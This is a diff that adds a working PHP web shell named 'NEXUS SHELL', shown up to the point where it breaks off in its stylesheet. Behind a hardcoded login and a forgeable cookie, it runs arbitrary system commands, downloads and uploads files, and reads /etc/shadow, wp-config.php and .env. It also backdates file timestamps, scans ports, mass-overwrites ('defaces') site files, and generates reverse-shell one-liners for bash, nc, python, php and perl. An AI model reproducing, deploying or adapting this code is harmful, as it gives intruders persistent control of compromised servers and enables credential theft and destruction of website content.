@@ -1,0 +1,1669 @@
+<?php
+// ====================== KONFIGURASI LOGIN (COOKIE BASED) ======================
+$LOGIN_USERNAME       = 'kampang26889';
+$LOGIN_PASSWORD_HASH  = '$2y$10$TaVs4UuTgcjcXXSmsC5/S.OSVkVueUJ8rUfscF3yxWgker0WFPeB2';
+
+error_reporting(0);
+ini_set('display_errors', 0);
+header('Content-Type: text/html; charset=UTF-8');
+set_time_limit(0);
+
+// ====================== FUNGSI LOGIN DENGAN COOKIE ======================
+function isLoggedIn() {
+    if (isset($_COOKIE['nexus_auth']) && $_COOKIE['nexus_auth'] === 'true') {
+        return true;
+    }
+    return false;
+}
+
+function setLogin() {
+    setcookie('nexus_auth', 'true', time() + 86400, '/');
+    $_COOKIE['nexus_auth'] = 'true';
+}
+
+function logout() {
+    setcookie('nexus_auth', '', time() - 3600, '/');
+    unset($_COOKIE['nexus_auth']);
+}
+
+function checkLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+    
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        $u = $_POST['login_user'];
+        $p = $_POST['login_pass'];
+        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
+            setLogin();
+            return true;
+        }
+        return false;
+    }
+    
+    if (isset($_GET['logout'])) {
+        logout();
+        return false;
+    }
+    
+    return isLoggedIn();
+}
+
+$is_ajax = (isset($_GET['q']) && $_GET['q'] == 'load') || (isset($_POST['a']) && $_POST['a'] == 'save');
+
+if (!checkLogin() && !$is_ajax) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Login Required</title>
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                font-family: 'Courier New', monospace;
+                background: linear-gradient(135deg, #0a0e27, #0a1628);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .login-box {
+                background: rgba(0,20,50,0.8);
+                backdrop-filter: blur(10px);
+                padding: 40px;
+                border-radius: 20px;
+                border: 1px solid #00ccff;
+                box-shadow: 0 0 50px rgba(0,100,255,0.3);
+                width: 350px;
+                text-align: center;
+            }
+            .login-box h2 { color: #00ccff; margin-bottom: 30px; }
+            .login-box input {
+                width: 100%;
+                padding: 12px;
+                margin: 10px 0;
+                background: rgba(0,0,0,0.5);
+                border: 1px solid #0066ff;
+                border-radius: 8px;
+                color: #00ffcc;
+                font-family: monospace;
+            }
+            .login-box button {
+                width: 100%;
+                padding: 12px;
+                background: linear-gradient(135deg,#0066ff,#00ccff);
+                border: none;
+                border-radius: 8px;
+                color: #fff;
+                font-weight: bold;
+                cursor: pointer;
+                margin-top: 20px;
+            }
+            .error { color: #ff3366; margin-top: 10px; }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <i class="fas fa-terminal" style="font-size:50px;color:#00ccff;"></i>
+            <h2>SECURE ACCESS</h2>
+            <?php if (isset($_POST['login_user'])): ?>
+                <div class="error">Invalid credentials!</div>
+            <?php endif; ?>
+            <form method="post">
+                <input type="text" name="login_user" placeholder="Username" required>
+                <input type="password" name="login_pass" placeholder="Password" required>
+                <button type="submit"><i class="fas fa-unlock-alt"></i> LOGIN</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ====================== FUNGSI GET DIR ======================
+function getCurrentDir() {
+    if (isset($_GET['dir']) && !empty($_GET['dir'])) {
+        $dir = $_GET['dir'];
+        $real = realpath($dir);
+        if ($real !== false && is_dir($real)) {
+            return str_replace('\\', '/', $real);
+        }
+    }
+    $cwd = getcwd();
+    return $cwd ? str_replace('\\', '/', $cwd) : '/';
+}
+
+$current_dir = getCurrentDir();
+$dir_url = urlencode($current_dir);
+$self_file = basename(__FILE__);
+
+// ====================== AJAX HANDLER ======================
+if (isset($_GET['q']) && $_GET['q'] == 'load' && isset($_GET['f'])) {
+    $file = $current_dir . '/' . basename($_GET['f']);
+    if (file_exists($file) && is_file($file) && is_readable($file)) {
+        echo file_get_contents($file);
+    } else {
+        echo "File not found or not readable";
+    }
+    exit;
+}
+
+if (isset($_POST['a']) && $_POST['a'] == 'save' && isset($_POST['f']) && isset($_POST['c'])) {
+    $file = $current_dir . '/' . basename($_POST['f']);
+    if (file_put_contents($file, $_POST['c']) !== false) {
+        @chmod($file, 0644);
+        echo "saved";
+    } else {
+        echo "error";
+    }
+    exit;
+}
+
+// ====================== FUNGSI DOWNLOAD ======================
+function downloadFile($url, $custom_name = '', $target_dir = '') {
+    if (empty($target_dir)) {
+        global $current_dir;
+        $target_dir = $current_dir;
+    }
+    
+    $filename = $custom_name ?: basename(parse_url($url, PHP_URL_PATH));
+    if (empty($filename)) $filename = 'downloaded_' . time() . '.file';
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
+    
+    $filepath = $target_dir . '/' . $filename;
+    
+    if (!is_dir($target_dir)) {
+        return ["success" => false, "error" => "Target directory not found: " . $target_dir];
+    }
+    
+    if (!is_writable($target_dir)) {
+        return ["success" => false, "error" => "Target directory not writable: " . $target_dir];
+    }
+    
+    $content = @file_get_contents($url);
+    if ($content !== false && !empty($content)) {
+        if (file_put_contents($filepath, $content) !== false) {
+            @chmod($filepath, 0644);
+            return ["success" => true, "filename" => $filename, "size" => filesize($filepath), "path" => $filepath];
+        }
+    }
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+        $content = curl_exec($ch);
+        curl_close($ch);
+        
+        if ($content !== false && !empty($content)) {
+            if (file_put_contents($filepath, $content) !== false) {
+                @chmod($filepath, 0644);
+                return ["success" => true, "filename" => $filename, "size" => filesize($filepath), "path" => $filepath];
+            }
+        }
+    }
+    
+    return ["success" => false, "error" => "Download failed!"];
+}
+
+// ====================== FUNGSI UNZIP ======================
+function extractZip($zip_file, $destination) {
+    if (empty($destination)) {
+        global $current_dir;
+        $destination = $current_dir;
+    }
+    
+    if (!class_exists('ZipArchive')) {
+        return ["success" => false, "error" => "ZipArchive class not available!"];
+    }
+    
+    if (!file_exists($zip_file)) {
+        return ["success" => false, "error" => "File not found: " . basename($zip_file)];
+    }
+    
+    $zip = new ZipArchive();
+    if ($zip->open($zip_file) !== true) {
+        return ["success" => false, "error" => "Cannot open zip file!"];
+    }
+    
+    if ($zip->extractTo($destination)) {
+        $zip->close();
+        return ["success" => true, "message" => "Extracted successfully!", "destination" => $destination];
+    }
+    
+    $zip->close();
+    return ["success" => false, "error" => "Extract failed!"];
+}
+
+// ====================== INSTALL ADMINER ======================
+function installAdminer() {
+    global $current_dir;
+    
+    $adminer_url = 'https://github.com/vrana/adminer/releases/download/v5.3.0/adminer-5.3.0-mysql.php';
+    $adminer_file = $current_dir . '/adminer.php';
+    
+    $content = @file_get_contents($adminer_url);
+    if ($content === false && function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $adminer_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    if ($content !== false && !empty($content)) {
+        if (file_put_contents($adminer_file, $content) !== false) {
+            @chmod($adminer_file, 0644);
+            return ["success" => true, "filename" => "adminer.php", "path" => $adminer_file];
+        }
+    }
+    return ["success" => false, "error" => "Failed to install Adminer!"];
+}
+
+// ====================== FUNGSI BACA CONFIG ======================
+function readConfigFile($filepath) {
+    if (file_exists($filepath) && is_file($filepath) && is_readable($filepath)) {
+        $content = file_get_contents($filepath);
+        $content = preg_replace("/(password|pass|pwd|key|secret|api_key|auth_token)\s*=\s*['\"]([^'\"]+)['\"]/i", "$1 = '********'", $content);
+        return $content;
+    }
+    return false;
+}
+
+// ====================== FUNGSI PHP NATIVE ======================
+function runCommand($cmd) {
+    $output = '';
+    if (function_exists('shell_exec')) {
+        $out = shell_exec($cmd . ' 2>&1');
+        if ($out !== null && $out !== false && $out !== '') return $out;
+    }
+    if (function_exists('exec')) {
+        $out = [];
+        exec($cmd . ' 2>&1', $out);
+        if (!empty($out)) return implode("\n", $out);
+    }
+    if (function_exists('system')) {
+        ob_start();
+        system($cmd . ' 2>&1');
+        $out = ob_get_clean();
+        if (!empty($out)) return $out;
+    }
+    return false;
+}
+
+function getProcessListPHP() {
+    $output = "=== PROCESS LIST ===\n\n";
+    $output .= "PID\t\tMemory Usage\t\tProcess\n";
+    $output .= str_repeat("-", 60) . "\n";
+    $output .= getmypid() . "\t\t" . number_format(memory_get_usage()) . " bytes\t\tCurrent PHP Process\n";
+    $output .= "N/A\t\t" . number_format(memory_get_peak_usage()) . " bytes\t\tPeak Memory Usage\n";
+    
+    if (is_dir('/proc')) {
+        $output .= "\n--- Processes from /proc ---\n";
+        $pids = scandir('/proc');
+        $count = 0;
+        foreach ($pids as $pid) {
+            if (is_numeric($pid) && $count < 30) {
+                $cmdline_file = "/proc/$pid/cmdline";
+                if (file_exists($cmdline_file)) {
+                    $cmdline = file_get_contents($cmdline_file);
+                    $cmdline = str_replace("\0", " ", $cmdline);
+                    if (strlen(trim($cmdline)) > 0) {
+                        $output .= "$pid\t\t-\t\t" . htmlspecialchars(substr($cmdline, 0, 60)) . "\n";
+                        $count++;
+                    }
+                }
+            }
+        }
+    }
+    return $output;
+}
+
+function getNetworkInfoPHP() {
+    $output = "=== NETWORK INFORMATION ===\n\n";
+    $output .= "Server IP: " . ($_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost')) . "\n";
+    $output .= "Your IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $output .= "Hostname: " . (gethostname() ?: php_uname('n')) . "\n";
+    return $output;
+}
+
+function getDiskInfoPHP() {
+    $output = "=== DISK INFORMATION ===\n\n";
+    $output .= "Filesystem\t\tSize\t\tUsed\t\tAvailable\tUse%\n";
+    $output .= str_repeat("-", 80) . "\n";
+    
+    $total = disk_total_space('/');
+    $free = disk_free_space('/');
+    $used = $total - $free;
+    $used_percent = round(($used / $total) * 100);
+    $output .= "/\t\t\t" . formatBytes($total) . "\t" . formatBytes($used) . "\t" . formatBytes($free) . "\t" . $used_percent . "%\n";
+    return $output;
+}
+
+function getMemoryInfoPHP() {
+    $output = "=== MEMORY INFORMATION ===\n\n";
+    $output .= "PHP Memory Limit: " . ini_get('memory_limit') . "\n";
+    $output .= "Current Memory Usage: " . formatBytes(memory_get_usage()) . "\n";
+    $output .= "Peak Memory Usage: " . formatBytes(memory_get_peak_usage()) . "\n";
+    
+    if (file_exists('/proc/meminfo')) {
+        $output .= "\n--- System Memory ---\n";
+        $meminfo = file_get_contents('/proc/meminfo');
+        $lines = explode("\n", $meminfo);
+        foreach ($lines as $line) {
+            if (strpos($line, 'MemTotal:') !== false) $output .= $line . "\n";
+            if (strpos($line, 'MemFree:') !== false) $output .= $line . "\n";
+            if (strpos($line, 'MemAvailable:') !== false) $output .= $line . "\n";
+            if (strpos($line, 'SwapTotal:') !== false) $output .= $line . "\n";
+            if (strpos($line, 'SwapFree:') !== false) $output .= $line . "\n";
+        }
+    }
+    return $output;
+}
+
+function getInterfaceInfoPHP() {
+    $output = "=== NETWORK INTERFACES ===\n\n";
+    $output .= "Server IP Addresses:\n";
+    $output .= "- " . ($_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())) . " (Server)\n";
+    $output .= "- " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . " (Your IP)\n";
+    $output .= "\nHostname: " . gethostname() . "\n";
+    return $output;
+}
+
+function formatBytes($bytes) {
+    if ($bytes === false || $bytes === null) return '?';
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
+    return round($bytes, 2) . ' ' . $units[$i];
+}
+
+function getDirectoryListingPHP() {
+    $dir = getcwd();
+    $output = "=== DIRECTORY LISTING: $dir ===\n\n";
+    $output .= "Type\tPermissions\tSize\t\tModified\t\tName\n";
+    $output .= str_repeat("-", 100) . "\n";
+    
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $full = $dir . '/' . $item;
+        $isDir = is_dir($full);
+        $type = $isDir ? "DIR" : "FILE";
+        $perms = getPermsStr($full);
+        $size = $isDir ? "-" : formatBytes(@filesize($full));
+        $modified = date("Y-m-d H:i:s", @filemtime($full));
+        $output .= sprintf("%-4s\t%s\t%-12s\t%s\t%s\n", $type, $perms, $size, $modified, $item);
+    }
+    return $output;
+}
+
+function getPermsStr($path) {
+    $p = @fileperms($path);
+    if ($p === false) return '????';
+    $info = is_dir($path) ? 'd' : '-';
+    $info .= ($p & 0x0100) ? 'r' : '-';
+    $info .= ($p & 0x0080) ? 'w' : '-';
+    $info .= ($p & 0x0040) ? 'x' : '-';
+    $info .= ($p & 0x0020) ? 'r' : '-';
+    $info .= ($p & 0x0010) ? 'w' : '-';
+    $info .= ($p & 0x0008) ? 'x' : '-';
+    $info .= ($p & 0x0004) ? 'r' : '-';
+    $info .= ($p & 0x0002) ? 'w' : '-';
+    $info .= ($p & 0x0001) ? 'x' : '-';
+    return $info;
+}
+
+function getPermNumber($path) {
+    $p = @fileperms($path);
+    if ($p === false) return '????';
+    return substr(sprintf('%o', $p), -4);
+}
+
+function getIcon($file, $isDir) {
+    if ($isDir) return '<i class="fas fa-folder" style="color:#ffcc00;"></i>';
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    $icons = [
+        'php' => 'fab fa-php', 'html' => 'fab fa-html5', 'css' => 'fab fa-css3-alt',
+        'js' => 'fab fa-js', 'py' => 'fab fa-python', 'sh' => 'fas fa-terminal',
+        'zip' => 'fas fa-file-archive', 'jpg' => 'fas fa-file-image', 'png' => 'fas fa-file-image',
+        'txt' => 'fas fa-file-alt', 'sql' => 'fas fa-database', 'ico' => 'fas fa-image'
+    ];
+    return isset($icons[$ext]) ? '<i class="' . $icons[$ext] . '"></i>' : '<i class="fas fa-file"></i>';
+}
+
+function portScan($host, $ports) {
+    $open_ports = [];
+    foreach ($ports as $port) {
+        $sock = @fsockopen($host, $port, $errno, $errstr, 1);
+        if ($sock) {
+            $open_ports[] = $port;
+            @fclose($sock);
+        }
+    }
+    return $open_ports;
+}
+
+function getUserList() {
+    $output = "=== USER LIST ON SERVER ===\n\n";
+    $output .= "UID\tUsername\t\tHome Directory\t\tShell\n";
+    $output .= str_repeat("-", 80) . "\n";
+    
+    if (file_exists('/etc/passwd') && is_readable('/etc/passwd')) {
+        $content = file_get_contents('/etc/passwd');
+        $lines = explode("\n", $content);
+        foreach ($lines as $line) {
+            if (empty($line)) continue;
+            $parts = explode(':', $line);
+            if (count($parts) >= 7) {
+                $username = $parts[0];
+                $uid = $parts[2];
+                $home = $parts[5];
+                $shell = $parts[6];
+                $output .= sprintf("%-8s %-20s %-20s %s\n", $uid, $username, $home, $shell);
+            }
+        }
+    } else {
+        $output .= "Cannot read /etc/passwd file!\n";
+    }
+    return $output;
+}
+
+// ====================== MASS CHMOD ======================
+function massChmodAllFiles($dir, $permission, $recursive) {
+    $count = 0;
+    $errors = [];
+    
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $fullpath = $dir . '/' . $item;
+        
+        if (is_dir($fullpath)) {
+            if ($recursive) {
+                $result = massChmodAllFiles($fullpath, $permission, true);
+                $count += $result['count'];
+                $errors = array_merge($errors, $result['errors']);
+            }
+            continue;
+        }
+        
+        if (@chmod($fullpath, octdec($permission))) {
+            $count++;
+        } else {
+            $errors[] = $fullpath;
+        }
+    }
+    return ['count' => $count, 'errors' => $errors];
+}
+
+// ====================== MASS DEFACE ======================
+function massDefaceAllFiles($dir, $content, $recursive) {
+    $count = 0;
+    $errors = [];
+    $extensions = ['php', 'html', 'htm', 'txt', 'js', 'css', 'xml', 'json', 'sql', 'py', 'sh', 'cgi', 'pl'];
+    
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        $fullpath = $dir . '/' . $item;
+        
+        if (is_dir($fullpath)) {
+            if ($recursive) {
+                $result = massDefaceAllFiles($fullpath, $content, true);
+                $count += $result['count'];
+                $errors = array_merge($errors, $result['errors']);
+            }
+            continue;
+        }
+        
+        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+        if (in_array($ext, $extensions)) {
+            if (file_put_contents($fullpath, $content) !== false) {
+                $count++;
+            } else {
+                $errors[] = $fullpath;
+            }
+        }
+    }
+    return ['count' => $count, 'errors' => $errors];
+}
+
+// ====================== COMMAND DISPATCHER ======================
+function executeCommand($cmd) {
+    global $current_dir;
+    $cmd_lower = strtolower(trim($cmd));
+    
+    if (preg_match('/^wget\s+(https?:\/\/[^\s]+)(?:\s+([^\s]+))?$/i', $cmd, $matches)) {
+        $url = trim($matches[1]);
+        $custom_name = isset($matches[2]) ? trim($matches[2]) : '';
+        $result = downloadFile($url, $custom_name, $current_dir);
+        if ($result['success']) {
+            return "✅ Download success!\nFile: " . $result['filename'] . "\nSize: " . formatBytes($result['size']) . "\nLocation: " . $result['path'];
+        } else {
+            return "❌ Download failed: " . $result['error'];
+        }
+    }
+    
+    if (preg_match('/^unzip\s+([^\s]+)$/i', $cmd, $matches)) {
+        $zip_file = $matches[1];
+        $full_zip_path = $current_dir . '/' . $zip_file;
+        
+        if (file_exists($full_zip_path)) {
+            $result = extractZip($full_zip_path, $current_dir);
+            if ($result['success']) {
+                return "✅ Unzip success: " . $zip_file . "\nExtracted to: " . $result['destination'];
+            } else {
+                return "❌ Unzip failed: " . $result['error'];
+            }
+        } else {
+            return "❌ File not found: " . $zip_file;
+        }
+    }
+    
+    $native_commands = [
+        'ps aux' => 'getProcessListPHP', 'ps' => 'getProcessListPHP',
+        'netstat' => 'getNetworkInfoPHP', 'netstat -tulnp' => 'getNetworkInfoPHP',
+        'ifconfig' => 'getInterfaceInfoPHP', 'ip a' => 'getInterfaceInfoPHP',
+        'df -h' => 'getDiskInfoPHP', 'df' => 'getDiskInfoPHP',
+        'free -m' => 'getMemoryInfoPHP', 'free' => 'getMemoryInfoPHP',
+    ];
+    
+    foreach ($native_commands as $key => $func) {
+        if ($cmd_lower == $key || strpos($cmd_lower, $key) === 0) {
+            return $func();
+        }
+    }
+    
+    $result = runCommand($cmd);
+    if ($result !== false) return $result;
+    
+    if ($cmd_lower == 'ls' || $cmd_lower == 'ls -la' || $cmd_lower == 'dir') return getDirectoryListingPHP();
+    elseif ($cmd_lower == 'pwd' || $cmd_lower == 'cwd') return "Current Directory: " . $current_dir;
+    elseif ($cmd_lower == 'whoami') return "PHP User: " . get_current_user() . "\nUID: " . getmyuid() . "\nGID: " . getmygid();
+    elseif ($cmd_lower == 'id') return "uid=" . getmyuid() . "(" . get_current_user() . ") gid=" . getmygid() . "(" . get_current_user() . ")";
+    elseif ($cmd_lower == 'uname' || $cmd_lower == 'uname -a') return "System: " . php_uname() . "\nPHP Version: " . phpversion();
+    elseif (strpos($cmd_lower, 'cat ') === 0) {
+        $file = substr($cmd, 4);
+        $full_path = $current_dir . '/' . $file;
+        if (file_exists($full_path) && is_readable($full_path)) return file_get_contents($full_path);
+        return "Cannot read file: $file";
+    }
+    
+    return "Command '$cmd' tidak tersedia.\n\nCommands: ls, pwd, whoami, id, uname, ps aux, netstat, ifconfig, df -h, free -m, wget [URL], unzip [file.zip], cat [file]";
+}
+
+// ====================== HANDLE REQUESTS ======================
+$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
+$msg_type = isset($_GET['msg_type']) ? $_GET['msg_type'] : '';
+$cmd_result = '';
+$scan_result = '';
+$userlist_result = '';
+$config_content = '';
+
+if (isset($_POST['cmd'])) {
+    $cmd_result = executeCommand($_POST['cmd']);
+}
+
+if (isset($_GET['read_config'])) {
+    $config_file = $_GET['read_config'];
+    $file_path = '';
+    
+    $config_files = [
+        'passwd' => '/etc/passwd',
+        'shadow' => '/etc/shadow',
+        'hosts' => '/etc/hosts',
+        'wp' => $current_dir . '/wp-config.php',
+        'env' => $current_dir . '/.env',
+        'config_inc' => $current_dir . '/config.inc.php'
+    ];
+    
+    if (isset($config_files[$config_file])) {
+        $file_path = $config_files[$config_file];
+        $content = readConfigFile($file_path);
+        if ($content !== false) {
+            $config_content = "=== " . basename($file_path) . " ===\n\n" . $content;
+        } else {
+            $config_content = "Cannot read file: " . $file_path;
+        }
+    } else {
+        $config_content = "Unknown config file requested.";
+    }
+}
+
+if (isset($_POST['wget_url'])) {
+    $url = $_POST['wget_url'];
+    $custom_name = isset($_POST['wget_name']) ? $_POST['wget_name'] : '';
+    $result = downloadFile($url, $custom_name, $current_dir);
+    if ($result['success']) {
+        $msg = "✅ Downloaded: " . $result['filename'] . " (" . formatBytes($result['size']) . ")";
+        $msg_type = "success";
+    } else {
+        $msg = "❌ " . $result['error'];
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['unzip_file'])) {
+    $zip_file = $current_dir . '/' . basename($_POST['unzip_file']);
+    if (file_exists($zip_file)) {
+        $result = extractZip($zip_file, $current_dir);
+        if ($result['success']) {
+            $msg = "✅ Unzip success: " . basename($zip_file);
+            $msg_type = "success";
+        } else {
+            $msg = "❌ " . $result['error'];
+            $msg_type = "error";
+        }
+    } else {
+        $msg = "❌ File not found: " . basename($zip_file);
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['install_adminer'])) {
+    $result = installAdminer();
+    if ($result['success']) {
+        $msg = "✅ Adminer installed! <a href='adminer.php' target='_blank' style='color:#00ff88;'>Open</a>";
+        $msg_type = "success";
+    } else {
+        $msg = "❌ " . $result['error'];
+        $msg_type = "error";
+    }
+}
+
+if (isset($_FILES['file'])) {
+    $target = $current_dir . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        @chmod($target, 0644);
+        $msg = "✅ Upload success: " . basename($target);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Upload failed!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_GET['delete'])) {
+    $target = $current_dir . '/' . basename($_GET['delete']);
+    if (is_file($target) && unlink($target)) {
+        $msg = "✅ Deleted: " . basename($target);
+        $msg_type = "success";
+    } elseif (is_dir($target) && rmdir($target)) {
+        $msg = "✅ Deleted folder: " . basename($target);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Delete failed!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['create_file'])) {
+    $name = $current_dir . '/' . basename($_POST['create_name']);
+    if (file_put_contents($name, '') !== false) {
+        @chmod($name, 0644);
+        $msg = "✅ File created: " . basename($name);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Failed to create file!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['create_dir'])) {
+    $name = $current_dir . '/' . basename($_POST['create_name']);
+    if (mkdir($name)) {
+        @chmod($name, 0755);
+        $msg = "✅ Folder created: " . basename($name);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Failed to create folder!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['chmod_submit'])) {
+    $target = $current_dir . '/' . basename($_POST['chmod_file']);
+    $perm = octdec($_POST['chmod_perm']);
+    if (@chmod($target, $perm)) {
+        $msg = "✅ Chmod " . $_POST['chmod_perm'] . " applied to " . basename($target);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Chmod failed!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['mass_chmod_all_files_submit'])) {
+    $target_dir = $_POST['mass_chmod_files_dir'];
+    $permission = $_POST['mass_chmod_files_perm'];
+    $recursive = isset($_POST['mass_chmod_files_recursive']);
+    
+    $result = massChmodAllFiles($target_dir, $permission, $recursive);
+    
+    if ($result['count'] > 0) {
+        $msg = "✅ Mass Chmod All Files selesai! " . $result['count'] . " file diubah menjadi " . $permission;
+        if (!empty($result['errors'])) $msg .= " (Gagal: " . count($result['errors']) . " file)";
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Tidak ada file yang ditemukan atau diubah!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['mass_deface_all_submit'])) {
+    $target_dir = $_POST['deface_all_dir'];
+    $content = $_POST['deface_all_content'];
+    $recursive = isset($_POST['deface_all_recursive']);
+    
+    $result = massDefaceAllFiles($target_dir, $content, $recursive);
+    
+    if ($result['count'] > 0) {
+        $msg = "✅ Mass Deface All Files selesai! " . $result['count'] . " file terpengaruh.";
+        if (!empty($result['errors'])) $msg .= " (Gagal: " . count($result['errors']) . " file)";
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Tidak ada file yang ditemukan atau dideface!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['rename_submit'])) {
+    $old = $current_dir . '/' . basename($_POST['rename_old']);
+    $new = $current_dir . '/' . basename($_POST['rename_new']);
+    if (rename($old, $new)) {
+        $msg = "✅ Renamed: " . basename($old) . " → " . basename($new);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Rename failed!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_POST['touch_submit'])) {
+    $target = $current_dir . '/' . basename($_POST['touch_file']);
+    $datetime = $_POST['touch_datetime'];
+    $datetime = str_replace('T', ' ', $datetime);
+    $timestamp = strtotime($datetime);
+    if ($timestamp && @touch($target, $timestamp)) {
+        $msg = "✅ Date changed for: " . basename($target) . " → " . date('Y-m-d H:i:s', $timestamp);
+        $msg_type = "success";
+    } else {
+        $msg = "❌ Failed to change date!";
+        $msg_type = "error";
+    }
+}
+
+if (isset($_GET['download'])) {
+    $file = $current_dir . '/' . basename($_GET['download']);
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        readfile($file);
+        exit;
+    }
+}
+
+if (isset($_POST['port_scan'])) {
+    $host = trim($_POST['scan_host']);
+    $ports_input = trim($_POST['scan_ports']);
+    
+    if (strpos($ports_input, '-') !== false) {
+        list($start, $end) = explode('-', $ports_input);
+        $ports = range(intval($start), intval($end));
+    } else {
+        $ports = explode(',', str_replace(' ', '', $ports_input));
+        $ports = array_map('intval', $ports);
+    }
+    
+    $open_ports = portScan($host, $ports);
+    
+    $scan_result = "=== PORT SCAN RESULTS ===\n";
+    $scan_result .= "Target: $host\n";
+    $scan_result .= "Ports scanned: " . count($ports) . "\n";
+    $scan_result .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
+    
+    if (count($open_ports) > 0) {
+        $scan_result .= "OPEN PORTS: " . implode(', ', $open_ports) . "\n";
+    } else {
+        $scan_result .= "NO OPEN PORTS FOUND!\n";
+    }
+}
+
+if (isset($_POST['get_user_list'])) {
+    $userlist_result = getUserList();
+}
+
+$rev_cmd = '';
+if (isset($_POST['gen_rev'])) {
+    $ip = $_POST['rev_ip'];
+    $port = $_POST['rev_port'];
+    $type = $_POST['rev_type'];
+    switch($type) {
+        case 'bash': $rev_cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1"; break;
+        case 'nc': $rev_cmd = "nc -e /bin/bash $ip $port"; break;
+        case 'python': $rev_cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'"; break;
+        case 'php': $rev_cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"; break;
+        case 'perl': $rev_cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"; break;
+    }
+    $msg = "✅ Reverse shell command generated!";
+    $msg_type = "success";
+}
+
+$user_info = "User: " . get_current_user() . " | UID: " . getmyuid() . " | GID: " . getmygid() . " | IP: " . $_SERVER['REMOTE_ADDR'];
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS SHELL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', 'Segoe UI', 'Courier New', monospace;
+            background: linear-gradient(135deg, #0f0c29 0%, #1a1a3e 50%, #0b0b2a 100%);
+            color: #e0e0e0;
+            padding: 24px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        /* Header */
+        .header {
